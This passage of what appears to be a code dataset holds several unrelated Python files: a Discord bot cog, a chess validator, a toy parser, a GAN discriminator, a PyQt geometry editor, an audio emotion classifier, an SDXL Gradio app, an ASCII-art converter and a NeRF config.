os.remove(f\"{os.path.abspath('')}/images/diary/{interaction.channel_id}/{interaction.user.id}_diary.png\")\n            except:\n                pass\n\n        except genshin.errors.InvalidCookies:\n            raise exc.GenshinInvalidCookies\n        except genshin.errors.GenshinException:\n            await interaction.followup.send(content=\"\uc6d4\uc740 \ud604\uc7ac \uae30\uc900 -2\ub2ec\uc785\ub2c8\ub2e4.\", ephemeral=True)\n\nasync def setup(bot: commands.Bot):\n    await bot.add_cog(Dirary(bot))",
    "#FUNCTIONS\n\ndef DisplayBoard(A8,B8,C8,D8,E8,F8,G8,H8,\n                 A7,B7,C7,D7,E7,F7,G7,H7,\n                 A6,B6,C6,D6,E6,F6,G6,H6,\n                 A5,B5,C5,D5,E5,F5,G5,H5,\n                 A4,B4,C4,D4,E4,F4,G4,H4,\n                 A3,B3,C3,D3,E3,F3,G3,H3,\n                 A2,B2,C2,D2,E2,F2,G2,H2,\n                 A1,B1,C1,D1,E1,F1,G1,H1,\n                 chessBoard):\n\n    print(chessBoard.format(\n                            A8,B8,C8,D8,E8,F8,G8,H8,\n                            A7,B7,C7,D7,E7,F7,G7,H7,\n                            A6,B6,C6,D6,E6,F6,G6,H6,\n                            A5,B5,C5,D5,E5,F5,G5,H5,\n                            A4,B4,C4,D4,E4,F4,G4,H4,\n                            A3,B3,C3,D3,E3,F3,G3,H3,\n                            A2,B2,C2,D2,E2,F2,G2,H2,\n                            A1,B1,C1,D1,E1,F1,G1,H1))\n\nclass Pieces:\n    class pawn:\n        def PawnValidate(startSquare,endSquare):\n            # check if square chossen is 1 ahead or behind unless on rank 2 or 7 then let it be up to 2 ahead or behind\n            # check pawn colour if black let it only advance down and vis-a-versa\n            # run check for enPassent https://en.wikipedia.org/wiki/En_passant\n            # add promation promt if required and implment in main\n            if startSquare[-1] not in (\"2\",\"7\",\"4\",\"5\"):\n                if endSquare == startSquare[0]+str(int(startSquare[-1])-1) and globals()[startSquare][0]==\"B\":\n                    return True, False\n                elif endSquare == startSquare[0]+str(int(startSquare[-1])+1) and globals()[startSquare][0]==\"W\":\n                    return True, False\n                else:\n                    print(\"Invalid square selected\")\n                    return False , False\n            if startSquare[-1] in (\"2\",\"7\"):\n                if globals()[startSquare][0] == \"W\" and startSquare[-1] == 2 and (endSquare == startSquare[0]+\"3\" or endSquare == startSquare[0]+\"4\"):\n                    return True , False \n                elif globals()[startSquare][0] == \"B\" and startSquare[-1] == 7 and (endSquare == startSquare[0]+\"6\" or endSquare == startSquare[0]+\"5\"):\n                    return True , False\n                elif globals()[startSquare][0] == \"W\" and startSquare[-1] == 7 and endSquare == startSquare[0]+str(int(startSquare[-1]+1)):\n                    return True , True\n                elif globals()[startSquare][0] == \"B\" and startSquare[-1] == 2 and endSquare == startSquare[0]+str(int(startSquare[-1]-1)):\n                    return True , True\n                else:\n                    print(\"Invalid move\")\n                    return False , False\n            return True , False\n    class rooks:\n        def RookMoveValidate(startSquare,endSquare):\n            if startSquare[0] == endSquare[0] or startSquare[-1] == endSquare[-1]:\n                if startSquare[0] != endSquare[0]:\n                    lettersChange = True\n                    numberChange = False\n                elif startSquare[-1] != endSquare[-1]:\n                    lettersChange = False\n                    numberChange = True\n                else:\n                    quit(\"FATAL ERROR ROOKMOVEVAILDATE NO CHANGE IN LETTERS OR NUMBER #90\")\n                \n                if lettersChange == True:\n                    start = int(ord(startSquare[0]))\n                    end = int(ord(endSquare[0]))\n                else:\n                    start = int(startSquare[-1])\n                    end = int(endSquare[-1])\n                \n                if start < end:\n                    startToEnd = True\n                    endToStart = False\n                elif end > start:\n                    startToEnd = False\n                    endToStart = True\n                elif start == end:\n                    print(\"Piece already at selected square\")\n                    return False\n                else:\n                    quit(\"FATAL ERROR #110\")\n                \n                if startToEnd == True and lettersChange == True:\n                    for x in range(start+1,end):\n                        if globals()[chr(x)+startSquare[-1]] != \" \":\n                            print(\"Piece in way\")\n                            return False\n                        \n                elif endToStart == True and lettersChange == True:\n                    for x in range(end+1,start-1):\n                        if globals()[chr(x)+startSquare[-1]] != \" \":\n                            print(\"Piece in way\")\n                            return False\n                        \n                elif startToEnd == True and numberChange == True:\n                    for x in range(start+1,end):\n                        if globals()[startSquare[0]+str(x)] != \" \":\n                            print(\"Piece in way\")\n                            return False\n                        \n                elif endToStart == True and numberChange == True:\n                    for x in range(end+1,start-1):\n                        if globals()[startSquare[-1]+str",
    "from src.tools import fatal_error\n\ndef parse_func(asts):\n    if len(asts) < 4:\n        fatal_error(f\"Unexpected end of asts {asts}\")\n    if isinstance(asts[0], list):\n        fatal_error(\"Unexpected list in asts\")\n    if asts[0][0] != \"name\":\n        fatal_error(f\"Unexpected ast type: {asts[0][0]}\")\n\n    name = asts[0][1]\n\n    if not isinstance(asts[1], list):\n        fatal_error(\"Expected list after func name\")\n\n    params = []\n    i = 0\n    while i < len(asts[1]):\n        arg = {\"name\": \"\"}\n        e = asts[1][i]\n        if isinstance(e, list):\n            fatal_error(\"Unexpected list in asts\")\n        if e[0] != \"name\":\n            fatal_error(f\"Unexpected ast type: {e[0]}\")\n        arg[\"type\"] = e[1]\n        i += 1\n        if i >= len(asts[1]):\n            params.append(arg)\n            break\n        e = asts[1][i]\n        if isinstance(e, list):\n            fatal_error(\"Unexpected list in asts\")\n        if e[0] == \"punct\" and e[1] == \",\":\n            params.append(arg)\n            i += 1\n            continue\n        if e[0] != \"name\":\n            fatal_error(f\"Unexpected ast type: {e[0]}\")\n        arg[\"name\"] = e[1]\n        params.append(arg)\n        i += 1\n        if i >= len(asts[1]):\n            break\n        e = asts[1][i]\n        if isinstance(e, list):\n            fatal_error(\"Unexpected list in asts\")\n        if e[0] != \"punct\" or e[1] != \",\":\n            fatal_error(f\"Expected \",\" but got {e}\")\n        i += 1\n\n    if isinstance(asts[2], list):\n        fatal_error(\"Unexpected list in asts\")\n    if asts[2][0] != \"name\":\n        fatal_error(f\"Unexpected ast type: {asts[2][0]}\")\n\n    if isinstance(asts[3], list):\n        fatal_error(\"Unexpected list in asts\")\n    if asts[3][0] == \"punct\":\n        if asts[3][1] == \";\":\n            return {\n                \"type\": \"funcproto\",\n                \"name\": name,\n                \"params\": params,\n                \"return\": asts[2][1],\n            }, 4\n        elif asts[3][1] == \"{\":\n            end = 4\n            while end < len(asts):\n                if isinstance(asts[end], list):\n                    end += 1\n                    continue\n                if asts[end][0] == \"punct\" and asts[end][1] == \"}\":\n                    return {\n                        \"type\": \"func\",\n                        \"name\": name,\n                        \"params\": params,\n                        \"return\": asts[2][1],\n                        \"body\": parse(asts[4:end]),\n                    }, end\n                end += 1\n            fatal_error(\"Unexpected end of asts\")\n        else:\n            fatal_error(f\"Unexpected punct: {asts[3][1]}\")\n    else:\n        fatal_error(f\"Unexpected ast: {asts[3]}\")\n\ndef parse(asts):\n    ret = []\n    i = 0\n    while i < len(asts):\n        ast = asts[i]\n        if isinstance(ast, list):\n            fatal_error(\"Unexpected list in asts\")\n        if ast[0] != \"name\":\n            i += 1\n            continue\n        if ast[1] == \"func\":\n            tmp, a = parse_func(asts[i + 1:])\n            ret.append(tmp)\n            i += a\n        else:\n            fatal_error(f\"Unexpected ast: {ast}\")\n        i += 1\n    return ret\n",
    "import torch \nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom torchvision.models.resnet import resnet50, ResNet50_Weights\n    \nclass ConvBlock(nn.Module):\n    def __init__(self, in_channels, out_channels, use_act, kernel_size=3, stride=1, padding=1):\n        super().__init__()\n        self.cnn = nn.Conv2d(\n            in_channels,\n            out_channels,\n            kernel_size=kernel_size,\n            stride=stride,\n            padding=padding\n        )\n        self.act = nn.LeakyReLU(0.2, inplace=True) if use_act else nn.Identity()\n        \n    def forward(self, x):\n        return self.act(self.cnn(x))\n\nclass Discriminator(nn.Module):\n    def __init__(self, in_channels=3, features=(64, 64, 128, 128, 256, 256, 512, 512)):\n        super().__init__()\n        self.in_channels = in_channels\n        self.features = list(features)\n\n        blocks = []\n\n        for idx, feature in enumerate(self.features):\n            blocks.append(\n                ConvBlock(\n                    in_channels=in_channels,\n                    out_channels=feature,\n                    kernel_size=3,\n                    stride=1 + idx % 2,\n                    padding=1,\n                    use_act=True\n                )\n            )\n            in_channels=feature\n\n        self.blocks = nn.Sequential(*blocks)\n\n        self.classifier = nn.Sequential(\n            nn.AdaptiveAvgPool2d((6, 6)),\n            nn.Flatten(),\n            nn.Linear(in_features=512*6*6, out_features=1024),\n            nn.LeakyReLU(0.2, inplace=True),\n            nn.Linear(in_features=1024, out_features=1)\n        )\n        self.sigmoid = nn.Sigmoid()\n\n    def forward(self, x):\n        features = self.blocks(x)\n        out = self.classifier(features)\n        out = self.sigmoid(out)\n        return out",
    "import sys\nimport pandas as pd\nfrom shapely.geometry import (\n    Point,\n    LineString,\n    Polygon\n)\nfrom PyQt5.QtWidgets import (\n    QFileDialog,\n    QGraphicsScene,\n    QGraphicsItem,\n    QGraphicsEllipseItem,\n    QGraphicsRectItem,\n    QGraphicsLineItem,\n    QGraphicsPolygonItem,\n    QMainWindow,\n    QApplication,\n    QShortcut\n)\nfrom PyQt5.uic import loadUi\nfrom PyQt5.QtGui import (\n    QPainter,\n    QBrush,\n    QPen,\n    QPolygonF,\n    QKeySequence\n)\nfrom PyQt5.QtCore import (\n    QPointF,\n    QLineF,\n    Qt\n)\nimport itertools\n\n\nclass Window(QMainWindow):\n\n\n    def deleteItem(self):\n        '''\n        \u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u043d\u043e\u0433\u043e \u043e\u0431\u044a\u0435\u043a\u0442\u0430\n        '''\n        items = self.scene.selectedItems()\n        if len(items) != 0:\n            for item in items:\n                self.scene.removeItem(item)\n\n\n    def saveNewItems(self):\n        '''\n        \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u043e\u0431\u044a\u0435\u043a\u0442\u043e\u0432 \u0432 \u0444\u0430\u0439\u043b\n        '''\n        items = self.scene.items()\n        if len(items) > 0:\n            with open('test_save_item.txt', 'w+') as fout:\n                for item in items:\n                    if item.type() == QGraphicsEllipseItem().type():\n                        coords = list(item.rect().getCoords()[0:2])\n                        row = ' '.join([ str(int(coord)) for coord in coords ])\n                    elif item.type() == QGraphicsRectItem().type():\n                        print(\"Rectangle\", list(item.rect().getCoords()))\n                    elif item.type() == QGraphicsLineItem().type():\n                        coords = [item.line().p1().x(), item.line().p1().y(), item.line().p2().x(), item.line().p2().y()]\n                        row = ' '.join([str(int(coord)) for coord in coords])\n                    elif item.type() == QGraphicsPolygonItem().type():\n                        coords = list(itertools.chain.from_iterable([[p.x(), p.y()] for p in item.polygon()]))\n                        row = ' '.join([str(int(coord)) for coord in coords])\n                    fout.writelines(row+'\\n')\n\n\n    def zoom(self, event):\n        '''\n        \u0418\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u0435 \u0437\u0443\u043c\u0430 \u0441\u0446\u0435\u043d\u044b\n        :param event: \u0441\u043e\u0431\u044b\u0442\u0438\u0435\n        '''\n        zoomInFactor = 1.25\n        zoomOutFactor = 1 / zoomInFactor\n        if event.angleDelta().y() > 0:\n            zoomFactor = zoomInFactor\n        else:\n            zoomFactor = zoomOutFactor\n        self.graphicsView.scale(zoomFactor, zoomFactor)\n\n\n    def mousePressEvent(self, event):\n        if event.button() == Qt.LeftButton:\n            self.graphicsView.startPos = event.pos()\n        else:\n            super(Window,self).mousePressEvent(event)\n\n\n    def mouseMoveEvent(self, event):\n        if self.graphicsView.startPos is not None:\n            delta = self.graphicsView.startPos - event.pos()\n            transform = self.graphicsView.transform()\n            deltaX = delta.x() / transform.m11()\n            deltaY = delta.y() / transform.m22()\n            self.graphicsView.setSceneRect(self.graphicsView.sceneRect().translated(deltaX, deltaY))\n            self.graphicsView.startPos = event.pos()\n        else:\n             super(Window, self).mouseMoveEvent(event)\n\n\n    def mouseReleaseEvent(self, event):\n        self.graphicsView.startPos = None\n        super(Window, self).mouseReleaseEvent(event)\n\n\n    def create_ui(self):\n        '''\n        \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u043e\u043c .ui\n        '''\n\n        loadUi(\"gui.ui\",self)\n\n        self.scene = QGraphicsScene(self)\n        self.graphicsView.setBackgroundBrush(Qt.white)\n        self.graphicsView.setDragMode(self.graphicsView.ScrollHandDrag)\n        self.graphicsView.setRenderHints(QPainter.Antialiasing | QPainter.SmoothPixmapTransform)\n        self.graphicsView.setOptimizationFlag(self.graphicsView.DontAdjustForAntialiasing, True)\n        self.graphicsView.wheelEvent = self.zoom\n        self.graphicsView.mouseMoveEvent = self.mouseMoveEvent\n        self.graphicsView.mousePressEvent = self.mousePressEvent\n        self.graphicsView.mouseReleaseEvent = self.mouseReleaseEvent\n        self.graphicsView.startPos = None\n        self.blueBrush = QBrush(Qt.blue)\n        self.blackPen = QPen(Qt.black)\n        self.blackPen.setWidth(1)\n        self.redPen = QPen(Qt.black)\n        self.bluePen = QPen(Qt.blue)\n        self.redPen.setWidth(1)\n        self.bluePen.setWidth(1)\n        self.graphicsView.setScene(self.scene)\n\n\n    def chunks(self, lst, size):\n        '''\n        \u0421\u043e\u0431\u0438\u0440\u0430\u0435\u0442 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043d\u044b\u0435 \u043f\u0430\u0440\u044b \u0434\u043b\u044f \u0441\u0442\u0440\u043e\u043a \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0445 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n        :param lst: \u0441\u043f\u0438\u0441\u043e\u043a \u0441 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430\u043c\u0438\n        :param size: \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u0434\u0441\u043f\u0438\u0441\u043a\u043e\u0432\n        :return: \u043d\u0430\u0431\u043e\u0440 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u043d\u044b\u0445 \u043f\u0430\u0440\n        '''\n        return [lst[i:i + size] for i in range(0, len(lst), size)]\n\n\n    def type_geom(self, x):\n        '''\n        \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u0438\u043f \u0433\u0435\u043e\u043c\u0435\u0442\u0440\u0438\u0438 \u0432 \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0438 \u0441 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e\u043c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u043d\u044b\u0445 \u0432 \u0444\u0430\u0439\u043b\u0435 \u0434\u043b\u044f \u043a\u0430\u0436\u0434\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438\n        :param x: \u0441\u0442\u0440\u043e\u043a\u0430 \u0438\u0437 \u0434\u0430\u0442\u0430\u0444\u0440\u0435\u0439\u043c\u0430\n        :return: \u0422\u0438\u043f \u0433\u0435\u043e\u043c\u0435\u0442\u0440\u0438\u0438\n        '''\n        if x['count_elements'] == 2:\n            return 'Point'\n        elif x['count_elements'] == 4:\n            return 'LineString'\n        elif x['count_eleme",
    "\"\"\"\nThis package defines a basic AI bot's Personality.\nStarting with a Base class setting the basic parameters\nfor Such as name, language model uses, and basic context sqlprompts defining its purpose.\n\"\"\"\nimport os\nfrom base_agent.voice import talk\nfrom regdbot.persona_prompts import sql_retrieval_augmented\nfrom base_agent import BasePersona\nimport yaml\ncdir = os.getcwd()\nif 'regdbot' not in os.listdir(cdir):\n    os.chdir('..')\nconfig = yaml.load(open('regdbot/config.yml', 'r'), Loader=yaml.FullLoader)\nos.chdir(cdir)\n\n\nlanguages = ['pt_BR', 'en_US']\n\n\nclass Persona(BasePersona):\n    def __init__(self, name: str = 'Reggie D. Bot', model: str = 'gpt-4-0125-preview'):\n        super().__init__(name=name, model=model, languages=languages)\n        self.name = name\n        self.languages = languages\n        self.active_language = languages[0]\n        self.context_prompt = sql_retrieval_augmented[self.active_language]\n\n    def set_language(self, language: str):\n        if language in self.languages:\n            self.active_language = language\n            self.voice = talk.Speaker(language=self.active_language)\n            self.say = self.voice.say\n            self.context_prompt = sql_retrieval_augmented[self.active_language]\n        else:\n            raise ValueError(f\"Language {language} not supported by this persona.\")\n",
    "from funasr import AutoModel\nimport os\n\n\n\n\nclass Audio2Emotion():\n    def __init__(self, models_path=\"\",  **kwargs):\n        def join_models_path(model_name):\n            if os.path.exists(os.path.join(models_path, model_name)):\n                return os.path.join(models_path, model_name)\n            else:\n                return model_name\n        if models_path[-1] == \"/\":\n            models_path = models_path[:-1]\n        if models_path.endswith(\"iic\"):\n            models_path = models_path[:-3]\n        self.main_model = kwargs.get(\"model\", \"iic/emotion2vec_base_finetuned\")\n\n        if models_path != \"\":\n            self.main_model = join_models_path(self.main_model)\n\n        kwargs.update({\"model\": self.main_model})\n        # print(kwargs)\n\n        self.model = AutoModel(**kwargs)\n        self.loaded = True\n    \n    def vec2emotion(self, emotion_vec):\n        if isinstance(emotion_vec, list):\n            emotion_vec = emotion_vec[0]\n        assert isinstance(emotion_vec, dict)\n        labels = emotion_vec[\"labels\"]\n        scores = emotion_vec[\"scores\"]\n        sorted_emotions = sorted(zip(labels, scores), key=lambda x: x[1], reverse=True)\n        return sorted_emotions[0][0]\n        \n    def get_emotion_vec(self, audio_path, granularity=\"utterance\", extract_embedding=False, output_dir=\"./Outputs/emotion_embedding\", **kwargs):\n        res = self.model.generate(audio_path,  granularity=granularity, extract_embedding=extract_embedding, output_dir=output_dir, **kwargs)\n        return res\n    \n    def get_emotion(self, audio_path, return_vec=False, **kwargs):\n        emotion_vec = self.get_emotion_vec(audio_path, **kwargs)\n        emotion = self.vec2emotion(emotion_vec)\n        if return_vec:\n            return emotion, emotion_vec\n        else:\n            return emotion\n        \n    def __enter__(self):\n        # \u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0\u8fdb\u5165 with \u8bed\u53e5\u65f6\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\n        return self\n\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        # \u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0\u9000\u51fa with \u8bed\u53e5\u65f6\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\n        pass\n\n\n\nif __name__ == \"__main__\":\n    audio_to_srt = Audio2Emotion(models_path=r\"E:\\AItools\\AudioLabeling\\models\")\n\n    audios_path = r\"E:\\AIDB\\\u82b1\u706b\\refer_audio\"\n    audio_list = [os.path.join(audios_path, i) for i in os.listdir(audios_path) if i.lower().endswith(\".wav\")]\n    for audio_path in audio_list:\n        emotion = audio_to_srt.get_emotion(audio_path=audio_path)\n        print(f\"{audio_path} : {emotion}\")",
    "import os\r\nimport torch\r\nimport random\r\nfrom diffusers import StableDiffusionXLPipeline\r\nfrom diffusers import EulerAncestralDiscreteScheduler\r\nimport gradio as gr\r\nfrom datetime import datetime\r\nfrom PIL import PngImagePlugin\r\nimport argparse\r\nfrom compel import Compel, ReturnedEmbeddingsType\r\n\r\nparser = argparse.ArgumentParser(description='AingUI Image Generation')\r\nparser.add_argument('--port', type=int, default=7860, help='Server port (default: 7860)')\r\nparser.add_argument('--listen', action='store_true', help='Listen on all network interfaces (default: False)')\r\nparser.add_argument('--auth', nargs='?', const='username:password', help='Set username and password for Gradio app (default: username:password)')\r\nparser.add_argument('--model-path', type=str, required=True, help='Path to the model file (required)')\r\nargs = parser.parse_args()\r\n\r\nif args.auth:\r\n    username, password = args.auth.split(':')\r\nelse:\r\n    username, password = None, None\r\n\r\nmodel_path = args.model_path\r\n\r\nif os.path.isdir(model_path):\r\n    model_name = os.path.basename(model_path)  # Extract the directory name\r\n    print(f\"Loading {model_name} Diffusers model...\")\r\n\r\n    pipe = StableDiffusionXLPipeline.from_pretrained(\r\n        model_path,\r\n        torch_dtype=torch.float16,\r\n        use_safetensors=True,\r\n    )\r\n    pipe.to('cuda')\r\n\r\n    pipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)\r\nelif model_path.endswith('.safetensors'):\r\n    model_name = os.path.basename(model_path).split('.safetensors')[0]  # Extract the filename without extension\r\n    print(f\"Loading {model_name} Safetensors model...\")\r\n\r\n    pipe = StableDiffusionXLPipeline.from_single_file(\r\n        model_path,\r\n        torch_dtype=torch.float16,\r\n        use_safetensors=True,\r\n    )\r\n    pipe.to('cuda')\r\n\r\n    pipe.scheduler = EulerAncestralDiscreteScheduler.from_config(pipe.scheduler.config)\r\nelse:\r\n    print(\"Invalid input. Please provide either a directory or a .safetensors file.\")\r\n    exit()  # Exit the script if the input is invalid\r\n\r\ndef generate_image(prompt, negative_prompt, use_seed_randomizer, custom_seed, enable_standard_quality, num_inference_steps, guidance_scale, resolution):\r\n    if use_seed_randomizer:\r\n        seed = random.randint(1, 999999999999)  # Maximum seed number is 12 digits\r\n        torch.manual_seed(seed)\r\n        random.seed(seed)\r\n        custom_seed = f\"{seed}\"\r\n    else:\r\n        if custom_seed:\r\n            seed = int(custom_seed)\r\n            torch.manual_seed(seed)\r\n            random.seed(seed)\r\n            custom_seed = f\"{seed}\"\r\n        else:\r\n            custom_seed = \"Seed not specified.\"\r\n    \r\n    # Update prompt based on checkbox state\r\n    if enable_standard_quality:\r\n        prompt += \", masterpiece, best quality, very aesthetic, absurdres,\"\r\n        negative_prompt = \"nsfw, lowres, (bad), text, error, fewer, extra, missing, worst quality, jpeg artifacts, low quality, watermark, unfinished, displeasing, oldest, early, chromatic aberration, signature, watermark, artistic error, username, scan, [abstract],\" + negative_prompt\r\n\r\n    compel = Compel(tokenizer=[pipe.tokenizer, pipe.tokenizer_2] , \r\n                text_encoder=[pipe.text_encoder, pipe.text_encoder_2], \r\n                returned_embeddings_type=ReturnedEmbeddingsType.PENULTIMATE_HIDDEN_STATES_NON_NORMALIZED, \r\n                requires_pooled=[False, True],\r\n               truncate_long_prompts=False)\r\n    \r\n    conditioning, pooled = compel([prompt, negative_prompt])\r\n\r\n    width, height = resolution.split(\" x \")\r\n    width = int(width)\r\n    height = int(height)\r\n\r\n    output = pipe(\r\n        prompt_embeds=conditioning[0:1], pooled_prompt_embeds=pooled[0:1], \r\n        negative_prompt_embeds=conditioning[1:2], negative_pooled_prompt_embeds=pooled[1:2],\r\n        width=width,\r\n        height=height,\r\n        guidance_scale=guidance_scale,\r\n        num_inference_steps=num_inference_steps\r\n    )\r\n\r\n    image = output.images[0]\r\n    image_width, image_height = image.size\r\n\r\n    # Create directory for saving images\r\n    current_date = datetime.now().strftime(\"%Y-%m-%d\")\r\n    save_dir = f\"generation/{current_date}\"\r\n    os.makedirs(save_dir, exist_ok=True)\r\n\r\n    # Create metadata dictionary\r\n    metadata = PngImagePlugin.PngInfo()\r\n    metadata_text = f\"{prompt}\\nNegative prompt: {negative_prompt}\\nSteps: {num_inference_steps}, Size: {image_width}x{image_height}, Seed: {custom_seed}, Model: {model_name}, Version: AingUI, Sampler: Euler a, CFG scale: {guidance_scale},\"\r\n    metadata.add_text(\"parameters\", metadata_text)\r\n\r\n    # Save the generated image with metadata\r\n    save_path = os.path.join(save_dir, f\"generated_image_{datetime.now().strftime('%H%M%S')}.png\")\r\n    image.save(save_path, pnginfo=metadata)\r\n\r\n    # Free GPU memory after generation\r\n    torch.cuda.empty_cache()\r\n\r\n    return save_path, custom_seed, metadata_text\r\n\r\ncss_style = \"\"\"\r\nimg {\r\n    max-height: 70vh;\r\n    width: auto;\r\n    display: block;\r\n    margin: 0 ",
    "import math\nimport sys\n\nfrom PIL import Image\n\n\ndef image_prompt():\n\n    while True:\n        path = input(\"Enter the path to your image file: \").replace('\"', \"\")\n        try:\n            img = Image.open(path)\n            break\n        except FileNotFoundError:\n            print(\"Invalid image path! try again\")\n            continue\n        except AttributeError:\n            print(\"Invalid image path! try again\")\n            continue\n    return img\n\n\ndef size_prompt():\n    while True:\n        maxsize = input(\"Enter how big you want it: \")\n        try:\n            maxsize = abs(int(maxsize))\n            break\n        except ValueError:\n            print(\"Please type a whole number!\")\n            continue\n    return maxsize\n\n\ndef light_bias_prompt():\n    while True:\n        light_bias = input(\"Enter a lightness bias ( larger number for lighter images, smaller number for darker images ): \")\n        try:\n            light_bias = abs(float(light_bias))\n            break\n        except ValueError:\n            print(\"Please type a number!\")\n            continue\n    return light_bias\n\n\ndef prepare_image():\n    if len(sys.argv) < 2:\n        img = image_prompt()\n    else:\n        try:\n            img = Image.open(sys.argv[1].replace('\"', \"\"))\n        except:\n            print(\"Invalid image\")\n\n    if len(sys.argv) < 3:\n        maxsize = size_prompt()\n    else:\n        maxsize = int(sys.argv[2])\n\n    if len(sys.argv) < 4:\n        light_bias = light_bias_prompt()\n    else:\n        light_bias = float(sys.argv[3])\n\n    if len(sys.argv) < 5:\n        output_location = None\n    else:\n        output_location = sys.argv[4]\n\n    img.thumbnail((maxsize, maxsize))\n\n    return img, light_bias, output_location\n\n\ndef to_ascii(img, width, height, light_bias, min_val, max_val):\n    art = \"\"\n    for y in range(height):\n        for x in range(width):\n            my_tuple = img.getpixel((x, y))\n            if my_tuple[1] == 0:\n                art += \"  \"\n            else:\n                art += (pixel_brightness(my_tuple[0], min_val, max_val, light_bias) + \" \")\n        art += \"\\n\"\n    return art\n\n\ndef find_brightness_range(img, width, height):\n    max_val = 0\n    min_val = 255\n    for y in range(height):\n        for x in range(width):\n            my_tuple = img.getpixel((x, y))\n            if my_tuple[0] > max_val and my_tuple[1] != 0:\n                max_val = my_tuple[0]\n            elif my_tuple[0] < min_val and my_tuple[1] != 0:\n                min_val = my_tuple[0]\n    return min_val, max_val\n\n\ndef pixel_brightness(grayscale_value, min_val, max_val, bias):\n    pixel = grayscale_value - min_val\n    pixel /= (max_val - min_val)\n    pixel = math.pow(pixel, bias)\n    pixel *= (len(ASCII_CHAR_MAP) - 1)\n\n    return ASCII_CHAR_MAP[math.ceil(pixel)]\n\n\nASCII_CHAR_MAP = \"@&%QWNM0gB$#DR8mHXKAUbGOpV4d9h6PkqwSE2]ayjxY5Zoen[ult13If}C{iF|(7J)vTLs?z/*cr!+<>;=^,_:'-.` \"\n\n\nuser_input = prepare_image()\nuser_image, lightness_bias, art_file = user_input[0], user_input[1], user_input[2]\nimage_width, image_height = user_image.size[0], user_image.size[1]\n\n\nbrightness_range = find_brightness_range(user_image.convert('LA'), image_width, image_height)\nlightest_pixel, darkest_pixel = brightness_range[0], brightness_range[1]\n\n\nascii_art = to_ascii(user_image.convert('LA'), image_width, image_height, lightness_bias, lightest_pixel, darkest_pixel)\n\nif art_file is None:\n    print(ascii_art)\nelse:\n    f = open(art_file, \"w\")\n    f.write(ascii_art)\n    f.close()\n",
    "'''\nAuthor: wenjun-VCC\nDate: 2024-04-04 20:53:50\nLastEditors: wenjun-VCC\nLastEditTime: 2024-04-08 21:53:02\nFilePath: config.py\nDescription: __discription:__\nEmail: wenjun.9707@gmail.com\nCopyright (c) 2024 by wenjun/VCC, All Rights Reserved. \n'''\nfrom dataclasses import dataclass\nimport sys\nimport os\n\nfrom datetime import datetime\ncurrent_time = datetime.now().strftime(\"%Y%m%d%H\")\n\n\nif sys.platform.startswith('win32'):\n    ROOT_PATH = 'E:/00_Code/VSCode/Python/nerf/nerf'\nelse:\n    ROOT_PATH = '/mnt/d/code/nerf/nerf'\n\n@dataclass\nclass NeRFConfig:\n    \n    # for log record\n    wandb_project='nerf-reproduce'\n    wandb_name='nerf-synthetic-lego'\n\n    # root path for data\n    root = os.path.join(ROOT_PATH, 'data/nerf_synthetic/lego')\n    \n    # images information\n    H = 800  # image height\n    W = 800  # image width\n    \n    # train strategy\n    max_epoch: int=100\n    warmup_epoch: int=10\n    replica: int=50\n    nrays_per_iter: int=1024  # n rays for each images per iter\n    half_res: bool=False\n    batch_size: int=8  # n images per iter\n    nworks: int=0\n    learning_rate: float=5e-4\n    min_lr: float=5e-6\n    resume: str=None\n    \n    # model config\n    dims=256\n    depth=10\n    is_fourier=True\n    pe_dim=12\n    view_depend=True\n    view_dim=6\n    \n    # coarse to fine\n    sample1: int=64\n    sample2: int=192\n    \n    # test and predict strategy\n    nrays_per_iter_test :int=6400  # recommend 6400 or 3200 for 800*800 image\n    groups: int=H*W//nrays_per_iter_test  # n groups for one images\n    # how many images(angles) you want to generate for 360 synthetic views\n    nangles: int=360\n    # image save path in data_process.py\n    image_save_path: str=os.path.join(ROOT_PATH, 'results', wandb_name, 'inf_image') \n    # where to save the pkl files in test and predict\n    inf_save_path: str=os.path.join(ROOT_PATH, 'results', wandb_name, 'inf_pkl')\n    # ckpt path for test and predict\n    ckpt_path: str=None\n    # pkl folder for get image\n    pkl_path: str=None\n    \n    # ckpt config\n    save_top_k: int=3\n    save_every_n_epoch: int=10\n    ckpt_save_path=os.path.join(ROOT_PATH, 'results', f'NeRF_{current_time}', 'ckpt')\n    log_dir=os.path.join(ROOT_PATH, 'results', f'NeRF_{current_time}', 'logs')\n    \n\n",
